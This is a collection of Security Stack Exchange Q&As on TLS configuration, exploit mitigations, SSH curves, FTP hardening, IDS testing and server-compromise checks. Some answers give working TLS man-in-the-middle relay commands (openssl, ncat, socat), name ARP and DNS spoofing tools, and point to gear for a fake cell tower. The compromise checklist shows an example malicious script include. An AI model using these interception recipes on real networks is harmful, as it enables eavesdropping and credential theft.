<p>The ssl_ciphers command is the meat of the choice, here, as nginx will inform OpenSSL of our preferred cipher suite list.  Please, please use the openssl ciphers -v command to see the results you get on your platform.  Ideally, check it again after changing OpenSSL versions.</p>

<p>Also, please read <a href=""https://scotthelme.co.uk/setting-up-hsts-in-nginx/"">Scott Helme's article on Setting up HSTS (HTTP Strict Transport Security) in nginx</a>, which will allows a host to enforce the use of HTTPS on the client side.  Be sure to include the HSTS header inside the http block with the ssl listen statement.</p>

<p>Edited to add: At least after this (if not before also), go to <a href=""https://www.ssllabs.com/"">Qualys SSL Labs</a> to see HTTPS security information and to <a href=""https://www.ssllabs.com/ssltest/"">Test Your Server</a> that's been kept pretty well up to date for the last few years.  Recommendations change regularly, and sometimes even frequently reverse themselves (RC4, for example, what nearly whiplash inducing).  You can also even <a href=""https://www.ssllabs.com/ssltest/viewMyClient.html"">Test Your Browser</a>!</p>
","54670"
"does Avast SafeZone actually make a difference?","53503","","<p>SafeZone is a feature in Avast Anti-Virus which is like a virtual machine that only has a web broswer. The benifit of this is that it can't be infected with spyware and isn't suseptible to keylogers. This makes it useful for online banking and other sensitive activities.</p>

<p>Is there any truth to that? The only thing keeping me from switching to ESET Smart Security is this feautre, and Avast's firewall integrates with the Windows firewall. How does SafeZone work?</p>
","<p>Yes, this is a well established technique for secure access to online banking and such. </p>

<p>The idea is to build a brand new machine from scratch every time you want to log onto your bank, and wiping it afterwards. Because the machine is only on for a few brief moments at a time, and because you do nothing with it apart from visiting your bank, it becomes very hard for spyware or other malicious software to infect it.</p>

<p>Obviously building a machine from bare metal every time is a pain, so to make this a practical technique you either use a VM, using a fresh copy of the disk image every time you use it, which is the approach SafeZone takes or a LiveCD.</p>

<p>It's a good technique, but if you want to switch to a different vendor, you still can, and implement this technique yourself. The easiest way is a LiveCD; a VM is very slightly harder to set up but easier to use. Both are available for free, for example you can grab a Ubuntu LiveCD from <a href=""http://www.ubuntu.com/download/desktop"">http://www.ubuntu.com/download/desktop</a> or a copy of VMPlayer from <a href=""http://www.vmware.com/products/player/"">http://www.vmware.com/products/player/</a></p>

<p>I suggest above that you use a fresh copy of the disk image with the VM; alternatively you can use the same image each time. This is slightly less secure in theory, but still fine for regular use, and makes it simpler. SafeZone defaults to this approach it appears, with a button to push if you do want to throw away a used image.
(hat tip to @polynomial's comment below for this)</p>

<p>Lastly, whether you use VM or LiveCD, one point that people sometimes miss is that you should regularly make sure that you have updated them with the latest security patches.  </p>
","16845"
"How do ASLR and DEP work?","53501","","<p>How do Address Space Layout Randomisation (ASLR) and Data Execution Prevention (DEP)  work, in terms of preventing vulnerabilities from being exploited? Can they be bypassed?</p>
","<p>Address Space Layout Randomisation (ASLR) is a technology used to help prevent shellcode from being successful. It does this by randomly offsetting the location of modules and certain in-memory structures. Data Execution Prevention (DEP) prevents certain memory sectors, e.g. the stack, from being executed. When combined it becomes exceedingly difficult to exploit vulnerabilities in applications using shellcode or return-oriented programming (ROP) techniques.</p>

<p>First, let's look at how a normal vulnerability might be exploited. We'll skip all the details, but let's just say we're using a stack buffer overflow vulnerability. We've loaded a big blob of <code>0x41414141</code> values into our payload, and <code>eip</code> has been set to <code>0x41414141</code>, so we know it's exploitable. We've then gone and used an appropriate tool (e.g. Metasploit's <code>pattern_create.rb</code>) to discover the offset of the value being loaded into <code>eip</code>. This is the start offset of our exploit code. To verify, we load <code>0x41</code> before this offset, <code>0x42424242</code> at the offset, and <code>0x43</code> after the offset.</p>

<p>In a non-ASLR and non-DEP process, the stack address is the same every time we run the process. We know exactly where it is in memory. So, let's see what the stack looks like with the test data we described above:</p>

<pre><code>stack addr | value
-----------+----------
 000ff6a0  | 41414141
 000ff6a4  | 41414141
 000ff6a8  | 41414141
 000ff6aa  | 41414141
&gt;000ff6b0  | 42424242   &gt; esp points here
 000ff6b4  | 43434343
 000ff6b8  | 43434343
</code></pre>

<p>As we can see, <code>esp</code> points to <code>000ff6b0</code>, which has been set to <code>0x42424242</code>. The values prior to this are <code>0x41</code> and the values after are <code>0x43</code>, as we said they should be. We now know that the address stored at <code>000ff6b0</code> will be jumped to. So, we set it to the address of some memory that we can control:</p>

<pre><code>stack addr | value
-----------+----------
 000ff6a0  | 41414141
 000ff6a4  | 41414141
 000ff6a8  | 41414141
 000ff6aa  | 41414141
&gt;000ff6b0  | 000ff6b4
 000ff6b4  | cccccccc
 000ff6b8  | 43434343
</code></pre>

<p>We've set the value at <code>000ff6b0</code> such that <code>eip</code> will be set to <code>000ff6b4</code> - the next offset in the stack. This will cause <code>0xcc</code> to be executed, which is an <code>int3</code> instruction. Since <code>int3</code> is a software interrupt breakpoint, it'll raise an exception and the debugger will halt. This allows us to verify that the exploit was successful.</p>

<pre><code>&gt; Break instruction exception - code 80000003 (first chance)
[snip]
eip=000ff6b4
</code></pre>

<p>Now we can replace the memory at <code>000ff6b4</code> with shellcode, by altering our payload. This concludes our exploit.</p>

<p>In order to prevent these exploits from being successful, Data Execution Prevention was developed. DEP forces certain structures, including the stack, to be marked as non-executable. This is made stronger by CPU support with the No-Execute (NX) bit, also known as the XD bit, EVP bit, or XN bit, which allows the CPU to enforce execution rights at the hardware level. DEP was introduced in Linux in 2004 (kernel 2.6.8), and Microsoft introduced it in 2004 as part of WinXP SP2. Apple added DEP support when they moved to the x86 architecture in 2006. With DEP enabled, our previous exploit won't work:</p>

<pre><code>&gt; Access violation - code c0000005 (!!! second chance !!!)
[snip]
eip=000ff6b4
</code></pre>

<p>This fails because the stack is marked as non-executable, and we've tried to execute it. To get around this, a technique called Return-Oriented Programming (ROP) was developed. This involves looking for small snippets of code, called ROP gadgets, in legitimate modules within the process. These gadgets consist of one or more instructions, followed by a return. Chaining these together with appropriate values in the stack allows for code to be executed.</p>

<p>First, let's look at how our stack looks right now:</p>

<pre><code>stack addr | value
-----------+----------
 000ff6a0  | 41414141
 000ff6a4  | 41414141
 000ff6a8  | 41414141
 000ff6aa  | 41414141
&gt;000ff6b0  | 000ff6b4
 000ff6b4  | cccccccc
 000ff6b8  | 43434343
</code></pre>

<p>We know that we can't execute the code at <code>000ff6b4</code>, so we have to find some legitimate code that we can use instead. Imagine that our first task is to get a value into the <code>eax</code> register. We search for a <code>pop eax; ret</code> combination somewhere in any module within the process. Once we've found one, let's say at <code>00401f60</code>, we put its address into the stack:</p>

<pre><code>stack addr | value
-----------+----------
 000ff6a0  | 41414141
 000ff6a4  | 41414141
 000ff6a8  | 41414141
 000ff6aa  | 41414141
&gt;000ff6b0  | 00401f60
 000ff6b4  | cccccccc
 000ff6b8  | 43434343
</code></pre>

<p>When this shellcode is executed, we'll get an access violation again:</p>

<pre><code>&gt; Access violation - code c0000005 (!!! second chance !!!)
eax=cccccccc ebx=01020304 ecx=7abcdef0 edx=00000000 esi=7777f000 edi=0000f0f1
eip=43434343 esp=000ff6ba ebp=000ff6ff
</code></pre>

<p>The CPU has now done the following:</p>

<ul>
<li>Jumped to the <code>pop eax</code> instruction at <code>00401f60</code>.</li>
<li>Popped <code>cccccccc</code> off the stack, into <code>eax</code>.</li>
<li>Executed the <code>ret</code>, popping <code>43434343</code> into <code>eip</code>.</li>
<li>Thrown an access violation because <code>43434343</code> isn't a valid memory address.</li>
</ul>

<p>Now, imagine that, instead of <code>43434343</code>, the value at <code>000ff6b8</code> was set to the address of another ROP gadget. This would mean that <code>pop eax</code> gets executed, then our next gadget. We can chain gadgets together like this. Our ultimate goal is usually to find the address of a memory protection API, such as <code>VirtualProtect</code>, and mark the stack as executable. We'd then include a final ROP gadget to do a <code>jmp esp</code> equivilent instruction, and execute shellcode. We've successfully bypassed DEP!</p>

<p>In order to combat these tricks, ASLR was developed. ASLR involves randomly offsetting memory structures and module base addresses to make guessing the location of ROP gadgets and APIs very difficult.</p>

<p>On Windows Vista and 7, ASLR randomises the location of executables and DLLs in memory, as well as the stack and heaps. When an executable is loaded into memory, Windows gets the processor's timestamp counter (TSC), shifts it by four places, performs division mod 254, then adds 1. This number is then multiplied by 64KB, and the executable image is loaded at this offset. This means that there are 256 possible locations for the executable. Since DLLs are shared in memory across processes, their offsets are determined by a system-wide bias value that is computed at boot. The value is computed as the TSC of the CPU when the <code>MiInitializeRelocations</code> function is first called, shifted and masked into an 8-bit value. This value is computed only once per boot.</p>

<p>When DLLs are loaded, they go into a shared memory region between <code>0x50000000</code> and <code>0x78000000</code>. The first DLL to be loaded is always ntdll.dll, which is loaded at <code>0x78000000 - bias * 0x100000</code>, where <code>bias</code> is the system-wide bias value computed at boot. Since it would be trivial to compute the offset of a module if you know ntdll.dll's base address, the order in which modules are loaded is randomised too.</p>

<p>When threads are created, their stack base location is randomised. This is done by finding 32 appropriate locations in memory, then choosing one based on the current TSC shifted masked into a 5-bit value. Once the base address has been calculated, another 9-bit value is derived from the TSC to compute the final stack base address. This provides a high theoretical degree of randomness.</p>

<p>Finally, the location of heaps and heap allocations are randomised. This is computed as a 5-bit TSC-derived value multiplied by 64KB, giving a possible heap range of <code>00000000</code> to <code>001f0000</code>.</p>

<p>When all of these mechanisms are combined with DEP, we are prevented from executing shellcode. This is because we cannot execute the stack, but we also don't know where any of our ROP instructions are going to be in memory. Certain tricks can be done with <code>nop</code> sleds to create a probabilistic exploit, but they are not entirely successful and aren't always possible to create.</p>

<p>The only way to reliably bypass DEP and ASLR is through an pointer leak. This is a situation where a value on the stack, at a reliable location, might be used to locate a usable function pointer or ROP gadget. Once this is done, it is sometimes possible to create a payload that reliably bypasses both protection mechanisms.</p>

<p>Sources:</p>

<ul>
<li>Windows Internals 5th Edition - Mark Russinovich</li>
<li><a href=""http://www.symantec.com/avcenter/reference/Address_Space_Layout_Randomization.pdf"">An Analysis of ASLR in Windows Vista - Symantec</a></li>
<li><a href=""http://en.wikipedia.org/wiki/Address_space_layout_randomization"">ASLR on Wikipedia</a></li>
<li><a href=""http://en.wikipedia.org/wiki/Data_Execution_Prevention"">DEP on Wikipedia</a></li>
</ul>

<p>Further reading:</p>

<ul>
<li><a href=""http://www.corelan.be/index.php/2009/07/19/exploit-writing-tutorial-part-1-stack-based-overflows/"">Stack-based exploit writing - CoreLAN</a></li>
<li><a href=""https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/"">Bypassing stack cookies, SafeSEH, SEHOP, HW DEP and ASLR - CoreLAN</a></li>
<li><a href=""https://www.corelan.be/index.php/2009/09/21/exploit-writing-tutorial-part-6-bypassing-stack-cookies-safeseh-hw-dep-and-aslr/"">Bypassing ASLR/DEP - exploit-db</a></li>
</ul>
","18557"
"Expired SSL Certificate Implications","53387","","<p>What are the security implications of an expired SSL certificate? For example if an SSL certificate from a trusted CA has expired will the communication channel continue to remain secure?</p>
","<p>The communication is still encrypted, but the trust mechanism is undermined. But usually the most important factor is that users will get ugly warning messages about the security of your site. Most won't make informed judgements about the integrity of the connection, they'll just go buy stuff elsewhere.</p>
","8396"
"Why Do we Need CAPTCHA? In what case we should use it?","53243","","<p>In what case we should implement Captcha based security?. How accurate it is and if there exists any alternatives for Captcha based Security. </p>
","<p>I am not going into basics of CAPTCHAs based security as you can read it from Wikipedia. But what interesting is how accurate they are and what are the evaluating parameters for them. To my knowledge CAPTCHAs has been broken in research with image processing techniques but still requires practical implementation and its just a matter of time i.e. you can read a recent <a href=""http://www.gizmocrazed.com/2011/11/captcha-code-cracked-stanford/"">Decaptcha techique</a>  . There are two ways to evaluate CAPTCHAs</p>

<ol>
<li>Coverage : Number of captchas a user attempts</li>
<li>Precision: Number of captchas answered correctly</li>
</ol>

<p>A very nice must <a href=""http://cdn.ly.tl/publications/text-based-captcha-strengths-and-weaknesses.pdf"">read paper</a> for understanding use of Captcha based security.</p>
","26098"
"How can I check that my cookies are only sent over encrypted https and not http? ","53067","","<p>I read a blog post <a href=""http://news.netcraft.com/archives/2010/11/03/github-moves-to-ssl-but-remains-firesheepable.html"">GitHub moves to SSL, but remains Firesheepable</a> that claimed that cookies can be sent unencrypted over http even if the site is only using https. They write that a cookie should be marked with a ""secure flag"", but I don't know how that flag look like.</p>

<p>How can I check that my cookies are only sent over encrypted https and not over unencrypted http, on my site that is only using https?</p>
","<p>The cookies secure flag looks like this:</p>

<blockquote>
  <p>secure;</p>
</blockquote>

<p>That's it.<br>
This should appear at the end of the Http header:</p>

<blockquote>
  <p>Set-Cookie: mycookie=somevalue; path=/securesite/; Expires=12/12/2010; secure; httpOnly; </p>
</blockquote>

<p>Of course, to check it, simply plug in any proxy or sniffer (I use the excellent <a href=""http://www.fiddler2.com/fiddler2/"">Fiddler</a>) and watch...</p>

<p>*Bonus: I also threw in there the httpOnly attribute, protects against cookie access from Javascript space, e.g. via XSS.</p>
","101"
"ECDSA vs ECDH vs Ed25519 vs Curve25519","53062","","<p>Among the ECC algorithms available in openSSH (ECDH, ECDSA, Ed25519, Curve25519), which offers the best level of security, and (ideally) why?</p>
","<p>In SSH, <em>two</em> algorithms are used: a key exchange algorithm (Diffie-Hellman or the elliptic-curve variant called ECDH) and a signature algorithm. The key exchange yields the secret key which will be used to encrypt data for that session. The signature is so that the client can make sure that it talks to the right server (another signature, computed by the client, may be used if the server enforces key-based client authentication).</p>

<p>ECDH uses a <em>curve</em>; most software use the standard NIST curve P-256. Curve25519 is another curve, whose ""sales pitch"" is that it is faster, not stronger, than P-256. The performance difference is very small in human terms: we are talking about less than a millisecond worth of computations on a small PC, and this happens only once per SSH session. You will not notice it. Neither curve can be said to be ""stronger"" than the other, not practically (they are both quite far in the ""cannot break it"" realm) nor academically (both are at the ""128-bit security level"").</p>

<p>Even when ECDH is used for the key exchange, most SSH servers and clients will use DSA or RSA keys for the signatures. If you want a signature algorithm based on elliptic curves, then that's ECDSA or Ed25519; for some technical reasons due to the precise definition of the curve equation, that's ECDSA for P-256, Ed25519 for Curve25519. There again, neither is stronger than the other, and speed difference is way too small to be detected by a human user.
However most browsers (including Firefox and Chrome) do not support ECDH any more (dh too).</p>

<p>Using P-256 should yield better interoperability right now, because Ed25519 is much newer and not as widespread. But, for a given server that you configure, and that you want to access from your own machines, interoperability does not matter much: you control both client and server software.</p>

<p>So, basically, the choice is down to aesthetics, i.e. completely up to you, with no rational reason. Security issues won't be caused by that choice anyway; the cryptographic algorithms are the strongest part of your whole system, not the weakest.</p>
","50890"
"Secure FTP access; best practices","52938","","<p>We have several web applications (B2B, B2C eCommerce) to which developers have access in order to upload files.</p>

<p>I need to ensure FTP part is well secure.</p>

<p>What is the best way(s) to go about it?</p>

<p>Currently, I've:</p>

<ul>
<li>Changed port number, and</li>
<li>Set a static IP (our local IP only) for the uploads</li>
</ul>

<p>Is that enough to make FTP access secure?</p>
","<p>although @mahbubut-r-aaman mentions it in passing, I thought I'd expand on the bit about SSH.  The answer I'd say for securing FTP is don't use FTP.  The reason being that it (by default) sends usernames and passwords in the clear, which isn't considered a very secure approach.</p>

<p>Instead you could look at SFTP (which uses the SSH protocol) or FTP(S) which uses the FTP protocol with SSL for encryption.</p>

<p>Additionally I'd suggest looking at a solution like <a href=""http://www.fail2ban.org/wiki/index.php/Main_Page"">fail2ban</a> to help block password guessing attempts.  </p>

<p>changing the port that it listens on is a bit helpful in avoiding the noise in your logs of random attacks, but you shouldn't rely on it.</p>

<p>locking down access to specific source IP addresses is a good idea if it's practical as it'll limit who can attempt to access the site.</p>
","23162"
"Where is my password stored on Linux?","52815","","<p>Is there a specific location where the passwords are stored ?</p>

<p>Is it depending on which version is used ?</p>

<p>Are they salted ?</p>
","<p>Linux passwords are stored in the <code>/etc/shadow</code> file. They are salted and the algorithm being used depends on the particular distribution and is configurable.</p>

<p>From what I recall, the algorithms supported are <code>MD5</code>, <code>Blowfish</code>, <code>SHA256</code> and <code>SHA512</code>. Most recent distributions should be on <code>SHA512</code> by default if my memory serves me right.</p>
","37051"
"Testing Snort IDS installation","52813","","<p>What is the easiest way to test Snort IDS after installing? Would using and writing a rule that captures all of the traffic work? </p>

<pre><code>alert ip any any -&gt; any any ( msg: ""ICMP packet detected!""; sid: 1; )
</code></pre>

<p>That is, using its own rules.</p>

<p>One way that I know of for testing Snort is by using some programs such as <code>Nmap</code>, <code>Metasploit</code>, and something else, but how can it be done?</p>
","<p>There are two subtly different things you might want to test.</p>

<ol>
<li>Is Snort working in the sense that it's running, able to sniff trafic, testing it against the rules, and alerting you when one is triggered?</li>
<li>Is Snort working in the sense that it's current rule set detects a specific intrusion of type X?</li>
</ol>

<p>To test case 1, you make a rule that's easy to fire, like your example, and fire it.
To test case 2, you have to attempt an intrusion of type X and confirm that it is detected.</p>

<p>You seem to be wanting to test case 1 (that the install has been done correctly) using the method in case 2, but you don't need to. Using a ""fake"" rule is a perfectly valid test that Snort is working in the first sense. And it's easier. Easy tests are good. You don't want to faff around with Metasploit when you're just checking that the alert emails go to the right person. Especially if you're not skilled in running intrusions - what if you do the intrusion wrong, and get a false test result? What if the intrusion attempt crashes the target (which is very likely on many types of intrusion.) </p>

<p>You really only need to test case 2, that a specific rule works against a real intrusion attempt, if you don't trust your rule set (in which case - why are you using it?) or if you're developing new rules. </p>
","15240"
"How to spoof a cell phone tower (cell site, base station) -- homemade IMSI-Catcher","52400","","<p>An answer to a <a href=""https://security.stackexchange.com/questions/11493/how-hard-is-it-to-intercept-sms-two-factor-authentication"">recent question</a> has given me an idea for a school project (security CS program).</p>

<blockquote>
  <p>Also, an active attacker (with a fake base station) can potentially force a mobile phone to use another variant [of encryption]...</p>
</blockquote>

<p>This sounds very cool, and I want to implement this on an at-home basis.</p>

<p><a href=""http://www.wired.com/threatlevel/2010/07/intercepting-cell-phone-calls/"" rel=""nofollow noreferrer"">This article</a> talks about a 2010 presentation of just such an experiment.  I've done some limited research, but I have two main questions:</p>

<p>What equipment would I need to buy and how much would it cost (this project is self-funded)?  The article said $1,500, including the laptop (which I already have), but did not give any specific information on the antenna.</p>

<p>What sort of APIs/libraries/etc., if any, exist for the communications protocols?  If none, I can probably try to implement the protocol myself, but this could take a lot of time.</p>

<p>Update:</p>

<p>Conclusion so far: While cell phones can operate in a HAM radio band in the United States, I'm concerned about potential legal implications of spoofing a cell phone tower.  Specifically, I think I would need to identify myself as another carrier in order to perform a MITM attack, which may be a crime.</p>

<p>Some helpful links:</p>

<ul>
<li><a href=""http://gnuradio.org/redmine/projects/gnuradio/wiki/OpenBTS"" rel=""nofollow noreferrer"">OpenBTS Wiki</a></li>
<li><a href=""http://gnuradio.org/redmine/projects/gnuradio/wiki/OpenBTSDesktopTestingKit"" rel=""nofollow noreferrer"">Desktop Testing (includes recommended hardware)</a></li>
<li><a href=""http://gnuradio.org/redmine/projects/gnuradio/wiki/OpenBTSSafeOperation"" rel=""nofollow noreferrer"">Safe Operation Guidelines</a></li>
<li><a href=""https://wush.net/trac/rangepublic"" rel=""nofollow noreferrer"">OpenBTS Page</a></li>
</ul>
","<p>Defcon has had a few presentations on this subject.  An active attacker can turn off encryption altogether, never mind just changing it.</p>

<p>Also there is an open source program available just for this.  I will edit this with the link when I find it.</p>

<p>Software: <a href=""http://openbts.sourceforge.net/"">http://openbts.sourceforge.net/</a><br>
Antennas <a href=""https://www.ettus.com/product/category/Antennas"">https://www.ettus.com/product/category/Antennas</a><br>
RF Daughterboards <a href=""https://www.ettus.com/product/category/Daughterboards"">https://www.ettus.com/product/category/Daughterboards</a><br>
Video: <a href=""https://www.youtube.com/watch?v=wjYAAmHvt-g"">https://www.youtube.com/watch?v=wjYAAmHvt-g</a></p>
","11553"
"What's an easy way to perform a man-in-the-middle attack on SSL?","52309","","<p>I'd like to perform a man-in-the-middle attack on SSL connections between clients and a server.</p>

<p>Assuming the following:</p>

<ul>
<li>I've got a certificate that the client will accept, via poor cert validation or other means.</li>
<li>I know the IP address of the server I'm trying to impersonate, and I'm in a position on the network to do things like ARP spoofing.</li>
<li>The underlying protocol could be anything, from HTTP to custom / proprietary stuff.</li>
</ul>

<p>I could write some code to listen on a port, serve up the certificate and initiate SSL, then forward stuff on as a transparent proxy, then do some ARP spoofing to redirect traffic to me, but that's a lot of effort and becomes cumbersome when working on a test that has a tight time constraint.</p>

<p>What's a quick / easy way to perform a man-in-the-middle attack? Are there any tools designed to facilitate this in a simple way, without lots of configuration? Something that's actively being maintained is a plus.</p>
","<p><strong>Updated:</strong> </p>

<ul>
<li><p><em>For HTTP</em> you can use <a href=""http://portswigger.net/burp/downloadfree.html"">Burp Suite's proxy</a> (Java), or <a href=""http://mitmproxy.org/"">mitmproxy</a>.  </p></li>
<li><p><a href=""http://www.tcpcatcher.org/""><em>tcpcatcher</em></a> is a more general Java-based GUI capture and modify proxy which might be closer to your requirements, it includes content decoding and modification (manual and programmatic). It's HTTP biased, but accepts any TCP. It has SSL support, though the only drawback seems to be there's no (documented) way to use your own <em>specific</em> certificate, only on-the-fly ones. You could easily use one of the options below to work around that.</p></li>
<li><a href=""http://ettercap.github.com/ettercap/""><em>ettercap</em></a> includes features for ARP, ICMP (redirect), DNS and DHCP ""interventions"", and supports direct SSL MITM (though not currently via GUI, you need to tinker with the conf and/or command line). This seems to be the best all-in-one for most purposes.</li>
<li><a href=""https://www.roe.ch/SSLsplit""><em>sslsplit</em></a> is another useful CLI tool, it's (mostly) for intercept and log, not modification. It's quicker to get started with than ettercap and has features like SNI inspection, dynamic certificate generation, support for *BSD and Linux FW/NAT, and <a href=""http://en.wikipedia.org/wiki/Online_Certificate_Status_Protocol"">OCSP</a>/<a href=""http://tools.ietf.org/html/draft-ietf-websec-key-pinning-11"">HPKP</a>/<a href=""http://www.chromium.org/spdy/spdy-protocol/spdy-protocol-draft2#TOC-Server-Advertisement-of-SPDY-through-the-HTTP-Alternate-Protocol-header"">SPDY</a> countermeasures for HTTPS. You still have to get the traffic <em>to</em> it though.</li>
</ul>

<p>If you want quick, low tech and protocol agnostic, you can get most of the way there with just OpenSSL on a unix box:</p>

<pre><code>mkfifo request response
openssl s_server -quiet -no_ssl2 -cipher AES128-SHA \
  -accept 443 -cert fake.crt -key fake.key  &lt; response | tee -a request
openssl s_client -quiet -connect www.server.com:443 &lt; request  | tee -a response
</code></pre>

<p>Start each <code>openssl</code> in a different terminal. Replace the <code>tee</code>'s with something scripted to modify requests and replies if needed. It's not the most robust, but it might be useful. It supports DTLS, should you require that, though it <a href=""https://lwn.net/Articles/486369/"">lacks IPv6 support</a> for <code>s_client</code>/<code>s_server</code>. (<a href=""http://www.gnutls.org/download.html"">GnuTLS</a> supports IPv6, and since v3.0 has DTLS support too, you can almost certainly do something similar with <code>gnutls-serv</code> and <code>gnutls-cli</code>, I haven't yet tried this though.)</p>

<p><a href=""http://nmap.org/ncat/guide/ncat-ssl.html""><code>ncat</code></a> with its <code>-exec</code> option should work too:</p>

<pre><code>ncat --ssl --ssl-cert fake.crt --ssl-key fake.key \
  --sh-exec ""openssl s_client -quiet -connect www.server.com:443"" \ 
  -kl 127.0.0.1 4443
</code></pre>

<p>You can just use ""<code>--exec</code>"" and wrap up your own client in a script instead. With <code>s_client</code> it helps performance a lot to pre-create a session file, then add <code>-sess_in ssl.sess -sess_out ssl.sess</code> to your invocations.</p>

<p>Again, if you need to script/code the MITM yourself <a href=""http://www.dest-unreach.org/socat/""><code>socat</code></a> is another good (and probably the most robust) option:</p>

<pre><code>CERT=""cert=test.crt,key=test.key,verify=0""
SSL=""cipher=AES128-SHA,method=TLSv1""
socat \ 
  OPENSSL-LISTEN:4443,bind=127.0.0.1,reuseaddr,$CERT,$SSL,fork  \
  EXEC:mitm.sh
</code></pre>

<p>With a one-liner like <code>openssl s_client -quiet -connect www.server.com:443</code> in <code>mitm.sh</code> to start with, works just like an <code>inetd</code> client.</p>

<p><a href=""https://www.stunnel.org/""><em>stunnel</em></a> is more proxy-like than socat, it has one <em>big</em> advantage that I don't see anywhere else: it supports in-protocol TLS upgrades/<a href=""http://en.wikipedia.org/wiki/STARTTLS"">STARTTLS</a>, for POP3, IMAP, SMTP and a few others; though LDAP and FTP are notable omissions (the latter understandably). Its <em>inetd</em> mode can be (ab)used just as with the ""exec"" options above.</p>

<p>For <em>modifying</em> generic text-based common internet protocols using these methods you might be able to get away with some <code>sed</code> (like a more connection friendly <a href=""http://silicone.homelinux.org/projects/netsed/"">netsed</a>) or light <code>expect</code> scripting. </p>

<p>The multi-protocol proxy <a href=""http://www.delegate.org/delegate/""><em>Delegate</em></a> also supports external (inetd-like) handling, and <a href=""http://www.delegate.org/delegate/Manual.htm#CFIscript"">integrated scripting</a> support for matching, filtering and rewriting for a <em>subset</em> of the supported protocols.</p>

<p>The only other things I can think of close to generic protocol agnostic MITM proxies are fuzzing tools, like <a href=""http://www.secforce.com/research/tools.html""><code>proxyfuzz</code></a>, or multi-protocol modular ones like <a href=""https://github.com/localh0t/backfuzz""><code>backfuzz</code></a> (be careful searching for that last one ;-).</p>

<p>Other possibly useful tools (for misdirecting traffic) include:</p>

<ul>
<li><a href=""http://www.monkey.org/~dugsong/dsniff/"">dsniff</a> , including <code>arpspoof</code></li>
<li>another <a href=""http://arpspoof.sourceforge.net/"">arpspoof</a> this version with IPv6 support</li>
<li><code>arpsend</code> from <a href=""http://openvz.org/Download/vzctl/4.2"">vzctl</a></li>
<li><a href=""https://thesprawl.org/projects/dnschef/"">dnschef</a> DNS proxy/server (Python)</li>
</ul>

<p>I also came across references to <a href=""http://www.balabit.com/network-security/zorp-gateway"">Zorp</a> several times while rummaging through my notes, non-free (I have no affiliations), but worth a mention due to its claims of being a modular, extensible multi-protocol firewall/gateway. SSH and TLS inspection are supported.</p>
","33376"
"How do you know your server has been compromised?","52170","","<p>I recently helped a client who had their server hacked. The hackers added some PHP code into the header of the homepage redirecting the user to a porn website — but only if they came from Google. This made it slightly harder for the client to spot. The client would see the website fine. Only new website visitors from Google would be directed to the porn site.</p>

<p>Last night a similar thing appeared to happen to a different client. I assumed it was a similar hack, but when I checked the codebase I could not find any malicious code.
His chrome browser is redirecting from the clients website to <code>www(dot)pc-site(dot)com</code>. I cannot replicate this behaviour. I guess it is possible that malicious code is being added and removed. So I need a more comprehensive way to tell if the server has been hacked.</p>

<p>Only 2 developers have access to this dedicated server (and the hosting company Rackspace).
The server is Red Hat Linux.</p>

<p><strong>What are the steps I go through to find out if the server has been hacked?</strong></p>
","<p><strong>UPDATED</strong></p>

<p>I would check the following:</p>

<ol>
<li><p>Logs. If you have root access you should check things like <code>history</code> which will give you command history and log files in <code>/var/logs</code>.</p></li>
<li><p>Baseline. If you have a baseline like file hashes to work with for application and system files this will help a lot. You can also use backups to compare a previous state. If using a backup to compare files, use a slightly older one if you can. The site may have been compromised a while before and it is only now that the redirect has been activated.</p></li>
<li><p>Check any includes. The files may not be on your server. They may be script includes such as <code>&lt;script src=”http://baddomain.com/s.js” /&gt;</code> or <code>iframe</code> type tags. Also do not exclude images, PDFs of Flash (SWF), video files. It is a fairly common trick to embed links in to files of a different content type. I would suggest you inspect them by hand particularly at the start and end of a file. The file may be completely a link/html/javascript or may be a legitimate image file with a link trailing at the end of the file.</p></li>
<li><p>Check for unusual file dates, sizes and permissions e.g. 777.</p></li>
<li><p>Check cron jobs for unusual jobs. Someone compromising a system will often leave a back door to get back in again and again. Cron is a very popular way to do this if they managed to get that far.</p></li>
<li><p>Check for the absence of files, you may not be able to have access to logs but the absence of them is equally a tell tail sign that someone has cleaned up after themself.</p></li>
<li><p>Use search engines. Not surprising search engines are great at finding everything. Use directives like <code>site:</code> e.g. <code>site:yoursitehere.com baddomain.com</code> see if you get any hits.</p></li>
<li><p>Often a link or redirect will be obfuscated so long javascript code with single letter variables should be analyzed carefully.</p></li>
<li><p>Do a packet capture with a tool like Wireshark or tcpdump from a secure workstation to the site. Save it to file and search the file for a parts of the url.</p></li>
<li><p>Check database records that may be queried or updated. The link could be injected in the database not the PHP.</p></li>
<li><p>Don't exclude the client's workstation. Use a free online virus scanner if need be. Also check <code>nslookup</code> and see what that resolves to. Check browser extensions, clear cache and check <code>hosts</code> files.</p></li>
</ol>

<p>To clean it up (if you are compromised) you really do need to go back to bare metal and reinstall. It is painful but is really the only way to be sure that you have got the whole lot.</p>

<p>To prevent it in the future you should be doing the following (although you may already be doing some of these):</p>

<ol>
<li><p>Harden servers, including using vendor recommendations on secure configurations, using up-to-date software. Apply tight security control such as permissions, password policies. Also see <a href=""https://security.stackexchange.com/questions/7141/folder-and-file-permission-shared-host-advice/7171#7171"">folder and file permission shared host advice</a>.</p></li>
<li><p>Implement quality control proceedures such as testing on low security environments, code review and testing.</p></li>
<li><p>Have your web application / web site vulnerability tested by a professional certified tester at least once. Look for EC-Council, ISO 27001 and PCI certified testers. <a href=""http://www.eccouncil.org/certification/licensed_penetration_tester.aspx"" rel=""noreferrer"">http://www.eccouncil.org/certification/licensed_penetration_tester.aspx</a></p></li>
<li><p>Check out OWASP www.owasp.org and <a href=""http://phpsec.org/projects/guide/2.html"" rel=""noreferrer"">http://phpsec.org/projects/guide/2.html</a> for web application security resources.</p></li>
<li><p>Use Intrusion Prevention System (IPS) tools. However depending on your hosting provider you may have limitations on what you can use. Host based IPS tools should be ok if you have a dedicated virtual machine.</p></li>
</ol>

<p>Hope that helps. Otherwise maybe you could provide more information about the systems you are running?</p>
","7448"
"Can my phone be hacked just by being called?","51944","","<p>I recently found a site, <a href=""http://cell-spy-stealth.com"">Cell-Spy-Stealth.com</a>, that claims to sell spyware which can be targeted on a phone by simply making a call to it: ""It will work even if you get the voice mail, or if the target phone is password protected."" It claims that after this one-time call, your phone will have access to all live SMS, calls, photos, videos, data, GPS (if enabled) and even the microphone while unused. It further claims that it is 100% undetectable and untraceable.  </p>

<p>Is this really possible? If so, would there be any way to neutralize such a breach?</p>
